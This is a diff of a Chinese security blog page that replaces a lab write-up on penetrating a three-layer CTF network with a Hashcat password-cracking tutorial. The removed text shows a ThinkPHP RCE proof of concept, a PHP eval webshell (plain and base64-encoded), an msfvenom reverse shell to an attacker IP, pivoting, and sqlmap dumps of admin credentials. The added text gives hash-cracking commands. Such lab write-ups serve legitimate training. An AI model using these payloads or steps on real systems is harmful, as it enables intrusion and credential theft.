@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CFS三层靶机搭建及其内网渗透【附靶场环境】, TeamsSix">
+    <meta name="keywords" content="【内网学习笔记】20、Hashcat 的使用, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>CFS三层靶机搭建及其内网渗透【附靶场环境】 | TeamsSix</title>
+    <title>【内网学习笔记】20、Hashcat 的使用 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CFS三层靶机搭建及其内网渗透【附靶场环境】</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】20、Hashcat 的使用</h1>
                 </div>
             </div>
         </div>
@@ -380,16 +380,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">内网渗透</span>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">学习笔记</span>
                             </a>
                         
-                            <a href="/tags/CFS/">
-                                <span class="chip bg-color">CFS</span>
+                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                <span class="chip bg-color">红队</span>
                             </a>
                         
-                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
-                                <span class="chip bg-color">比赛</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -400,8 +400,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%AE%9E%E4%BE%8B/" class="post-category">
-                                实例
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -413,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-21
+                    2021-08-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-08-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    12 分
                 </div>
                 
 
@@ -449,136 +449,220 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <blockquote>
-<p>本文首发地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></p>
-</blockquote>
-<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p>
-<a id="more"></a>
-<p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p>
-<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 1</p>
-<p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 2</p>
-<p>如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p>
+                <h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://hashcat.net/">https://hashcat.net</a></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
+<h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p>
+<pre><code>brew install hashcat</code></pre>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p>
+<pre><code>apt install hashcat</code></pre>
+<p>或者下载官方二进制文件进行安装</p>
+<p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p>
+<pre><code>tar zxvf hashcat-6.2.4.7z
+cd hashcat-6.2.4
+chmod +x hashcat.bin
+./hashcat.bin</code></pre>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p>
+<h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p>
+<pre><code>-r    使用自定义破解规则
+-o    指定破解成功后的 hash 及所对应的明文密码的存放位置
+-m    指定要破解的 hash 类型，如果不指定类型，则默认是 MD5
+-a    指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击
+-D    指定 opencl 的设备类型
+--show        显示已经破解的 hash 及该 hash 所对应的明文
+--force        忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项
+--remove    删除已被破解成功的 hash
+--username        忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到
+--increment        启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程
+--increment-min            密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用
+--increment-max            密码最大长度,同上
+--outfile-format        指定破解结果的输出格式 id ,默认是 3
+--self-test-disable    关闭启动自检</code></pre>
+<p>-a 破解模式：</p>
+<pre><code>0 | Straight        （字段破解）
+1 | Combination    （组合破解）
+3 | Brute-force    （掩码暴力破解）
+6 | Hybrid Wordlist + Mask（字典+掩码破解）
+7 | Hybrid Mask + Wordlist（掩码+字典破解）</code></pre>
+<p>-D 指定设备类型</p>
+<pre><code>1 | CPU
+2 | GPU
+3 | FPGA, DSP, Co-Processor</code></pre>
+<p>一般使用 -D 2 指定 GPU 破解</p>
+<p>掩码设置：</p>
+<pre><code>l | abcdefghijklmnopqrstuvwxyz                纯小写字母
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ                纯大写字母
+d | 0123456789                                                纯数字
+h | 0123456789abcdef                                    十六进制小写字母和数字
+H | 0123456789ABCDEF                                    十六进制大写字母和数字
+s |  !&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~    特殊字符
+a | ?l?u?d?s                                                    键盘上所有可见的字符
+b | 0x00 - 0xff                                                匹配密码空格</code></pre>
+<p>掩码设置举例：</p>
+<pre><code>八位数字密码：?d?d?d?d?d?d?d?d
+八位未知密码：?a?a?a?a?a?a?a?a
+前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d
+前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H
+前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a
+6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d
+6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</code></pre>
+<p>自定义掩码规则：</p>
+<pre><code>--custom-charset1 [chars]等价于 -1
+--custom-charset2 [chars]等价于 -2
+--custom-charset3 [chars]等价于 -3
+--custom-charset4 [chars]等价于 -4</code></pre>
+<p>在掩码中用 ?1、?2、?3、?4 来表示</p>
+<p>注意：</p>
+<ul>
+<li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li>
+<li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li>
+</ul>
+<p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p>
+<h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p>
+<pre><code>hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d</code></pre>
+<p>密码为 4 位小写字母+数字</p>
+<pre><code>hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1</code></pre>
+<p>密码为 1-4 位大写字母+数字</p>
+<pre><code>hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4</code></pre>
+<p>指定特定字符集：123456abcdf!@+- 进行破解</p>
+<pre><code>hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1</code></pre>
+<p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p>
+<pre><code>hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1</code></pre>
+<p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p>
+<pre><code>hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a</code></pre>
+<p>使用字典破解</p>
+<pre><code>hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt</code></pre>
+<p>使用字典批量破解</p>
+<pre><code>hashcat -a 0 hash.txt password.txt</code></pre>
+<p>字典组合破解</p>
+<pre><code>hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt</code></pre>
+<p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p>
+<p>pwd1.txt 字典为：</p>
+<pre><code>admin
+test
+root</code></pre>
+<p>pwd2.txt 字典为：</p>
+<pre><code>@2021
+123</code></pre>
+<p>那么组合后的字典就是这样的：</p>
+<pre><code>admin@2021
+admin123
+test@2021
+test123
+root@2021
+root123</code></pre>
+<p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p>
+<pre><code>hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l</code></pre>
+<h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre><code>hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</code></pre>
 <blockquote>
-<p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p>
+<p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p>
 </blockquote>
-<h1 id="0x02-Target1"><a href="#0x02-Target1" class="headerlink" title="0x02 Target1"></a>0x02 Target1</h1><h2 id="a、获取shell"><a href="#a、获取shell" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、先用nmap扫描一下Target1</p>
-<pre><code class="bash">root@kali:~# nmap -T4 -O 192.168.1.11
-Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT
-Nmap scan report for 192.168.1.11
-Host is up (0.00042s latency).
-Not shown: 994 filtered ports
-PORT     STATE  SERVICE
-20/tcp   closed ftp-data
-21/tcp   open   ftp
-22/tcp   open   ssh
-80/tcp   open   http
-888/tcp  open   accessbuilder
-8888/tcp open   sun-answerbook
-MAC Address: 00:0C:29:81:A6:6D (VMware)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.10 - 4.11
-Network Distance: 1 hop
-
-OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds</code></pre>
-<p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p>
-<p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p>
-<pre><code>/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p>
-<pre><code class="bash">echo &quot;&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;&quot; &gt; shell.php</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<pre><code>之前：&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;
-之后：&lt;?php @eval([&#39;TeamsSix&#39;]);?&gt;</code></pre>
-<p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p>
-<pre><code class="bash">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg==&quot; | base64 -d &gt; shell.php</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote>
-<p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p>
-</blockquote>
-<p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p>
-<pre><code class="bash">root@kali:~# ifconfig
-root@kali:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、在kali中配置运行监听模块</p>
-<pre><code class="bash">root@kali:~# msfconsole
-msf5 &gt; use exploit/multi/handler
-msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0
-msf5 exploit(multi/handler) &gt; set lport 6666
-msf5 exploit(multi/handler) &gt; options
-msf5 exploit(multi/handler) &gt; run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p>
-<pre><code class="bash">(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf
-(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p>
-<pre><code class="bash">run autoroute -s 192.168.22.0/24
-run autoroute -p
-
-这一步也可以使用run post/multi/manage/autoroute自动添加路由</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p>
-<pre><code class="bash">msf5 &gt; use auxiliary/server/socks4a
-msf5 auxiliary(server/socks4a) &gt; set srvport 2222
-msf5 auxiliary(server/socks4a) &gt; options
-msf5 auxiliary(server/socks4a) &gt; run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p>
-<pre><code class="bash">root@kali:~# vim /etc/proxychains.conf
-加入以下内容：
-socks4     192.168.1.113     2222</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p>
-<pre><code class="bash">root@kali:~# proxychains4 nmap -Pn -sT 192.168.22.22
--Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
--sT：扫描TCP数据包已建立的连接connect</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p>
-<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p>
-<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword --dbs</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、看看bagecms下有哪些表</p>
-<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms --tables</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、看一下bage_admin下的内容</p>
-<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin --columns</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p>
-<pre><code class="bash">root@kali:~# proxychains4 sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password --dump</code></pre>
